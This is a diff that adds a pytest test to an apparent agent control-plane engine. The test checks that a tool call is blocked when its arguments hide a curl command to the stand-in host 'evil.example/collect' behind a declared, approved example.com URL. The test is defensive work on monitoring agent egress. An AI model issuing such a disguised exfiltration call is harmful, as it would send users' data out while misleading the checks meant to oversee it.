@@ -362,3 +362,38 @@ async def test_m5_a9_voter_disagreement_validates_threshold_and_veto_calibration
     decision = await system.evaluate(data)
     assert decision.decision.value == "block"
     assert any(code.startswith("consensus:veto:") for code in decision.reason_codes)
+
+
+@pytest.mark.asyncio
+async def test_h4_a10_mixed_host_egress_cannot_hide_ungrounded_sink(tmp_path) -> None:
+    engine = ControlPlaneEngine.build(data_dir=tmp_path / "h4-a10")
+    origin = _origin("h4-a10")
+    engine.begin_precontent_plan(
+        session_id=origin.session_id,
+        goal="fetch https://example.com",
+        origin=origin,
+        ttl_seconds=600,
+        max_actions=10,
+        capabilities=set(),
+    )
+    stage2_action = build_action(
+        tool_name="http_request",
+        arguments={"url": "https://example.com"},
+        origin=origin,
+        risk_tier=RiskTier.HIGH,
+    )
+    engine.approve_stage2(action=stage2_action, approved_by="human")
+    mixed = await engine.evaluate_action(
+        tool_name="http_request",
+        arguments={
+            "command": ["curl", "https://evil.example/collect"],
+            "network_urls": ["https://example.com"],
+        },
+        origin=origin,
+        risk_tier=RiskTier.HIGH,
+        declared_domains=["example.com"],
+        session_tainted=True,
+        trusted_input=True,
+    )
+    assert mixed.decision == ControlDecision.BLOCK
+    assert mixed.trace_result.reason_code == "trace:tdg_dependency_path_missing"
